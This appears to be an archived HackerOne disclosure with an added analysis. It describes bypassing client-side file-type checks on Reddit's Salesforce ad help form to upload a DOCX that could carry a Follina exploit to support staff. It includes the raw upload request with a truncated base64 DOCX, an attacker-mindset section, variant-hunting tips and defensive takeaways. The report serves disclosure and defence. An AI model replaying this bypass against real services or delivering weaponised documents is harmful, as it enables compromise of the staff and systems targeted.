# Unrestricted File Upload on reddit.secure.force.com

## Metadata
- **Source:** HackerOne
- **Report:** 1606957 | https://hackerone.com/reports/1606957
- **Submitted:** 2022-06-20
- **Reporter:** heckintosh
- **Program:** Reddit
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Unrestricted File Upload, Client-side Validation Bypass, Malicious File Delivery
- **CVEs:** CVE-2022-30190
- **Category:** memory-binary

## Summary
Reddit's Salesforce instance at reddit.secure.force.com allows attackers to upload disallowed file types (e.g., DOCX files containing malicious payloads like CVE-2022-30190 Follina) despite client-side restrictions. The vulnerability exists in the ad help form endpoint where server-side validation is either absent or ineffective, enabling delivery of malicious documents to support staff.

## Attack scenario
1. Attacker identifies the ad help form at https://reddit.secure.force.com/adhelp which claims to accept only jpg, jpeg, gif, png, and pdf files
2. Client-side JavaScript prevents drag-and-drop of disallowed file types, but attacker uses the 'Click to browse' file picker option to bypass this restriction
3. Attacker crafts a malicious DOCX file containing CVE-2022-30190 Follina exploit payload designed to execute remote code when opened
4. Attacker uploads the DOCX file via the file upload mechanism, which bypasses client-side validation and is accepted by the server
5. The malicious file is stored on the server and associated with the support ticket
6. When Reddit support staff opens the attachment, the Follina exploit executes, compromising their system and potentially the internal network

## Root cause
Server-side file type validation is missing or inadequate. The application relies solely on client-side JavaScript validation for file type restrictions, which can be trivially bypassed. The backend endpoint at /adhelp/apexremote does not properly validate the uploaded file's actual type before accepting it.

## Attacker mindset
An attacker would recognize that client-side validation is purely cosmetic and focus on sending requests directly to the backend API. By crafting requests that mimic legitimate uploads, they can deliver weaponized documents to high-value targets (support staff) within the organization, leading to system compromise or lateral movement.

## Defensive takeaways
- Implement robust server-side file type validation using magic bytes/file signatures, not just file extensions
- Enforce strict whitelist of allowed MIME types and validate against actual file content
- Implement file scanning/sandboxing for uploaded content, particularly for Office documents
- Never rely on client-side validation for security controls; always validate on the server
- Store uploaded files outside the web root and serve them with appropriate Content-Disposition headers
- Implement rate limiting on file upload endpoints to prevent bulk malicious uploads
- Educate users about opening attachments from untrusted sources and implement email/document scanning

## Variant hunting
Search for similar patterns in other Salesforce instances or CRM systems where file upload endpoints fail to validate file types server-side. Look for other endpoints in reddit.secure.force.com that accept file uploads, particularly those handling user-submitted content. Investigate whether other file types (executable, script-based) can bypass validation.

## MITRE ATT&CK
- T1190
- T1204.002
- T1566.001
- T1566.002
- T1203

## Notes
The vulnerability is particularly critical because it targets support staff who are more likely to open attachments, and Follina is a zero-click or near-click vulnerability that doesn't require macro execution. The base64-encoded payload in the report appears to be a DOCX file structure. This is a classic example of why security-critical validation must always occur server-side.

## Full report
<details><summary>Expand</summary>

## Summary:
Reddit.secure.force.com is Reddit SalesForce instance. Attacker is able to send attachments of disallowed filetypes to this server. The attacker is able to send malicious documents such as CVE-2022-30190 Follina to the victim.

## Impact:
Attacker can send malicious files to whoever handles the form behind https://reddit.secure.force.com/adhelp

## Steps To Reproduce:
  1. Go to https://reddit.secure.force.com/adhelp 
  2. Notice that the specified allowed filetype is:  jpg jpeg gif png pdf as you can see with the image below: 

{F1780944}

  3. If you try dragging and dropping a docx file to that box, there is a Javascript which forbids such action. But if you used the "Click to browse" option you can start uploading the file.

{F1780957}

4. The file upload request: 

```http
POST /adhelp/apexremote HTTP/1.1
Host: reddit.secure.force.com
████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://reddit.secure.force.com/adhelp/
X-User-Agent: Visualforce-Remoting
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 15301
Origin: https://reddit.secure.force.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"action":"AdvertisingHelpController","method":"uploadFile","data":["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

</details>

---
*Analysed by Claude on 2026-05-24*
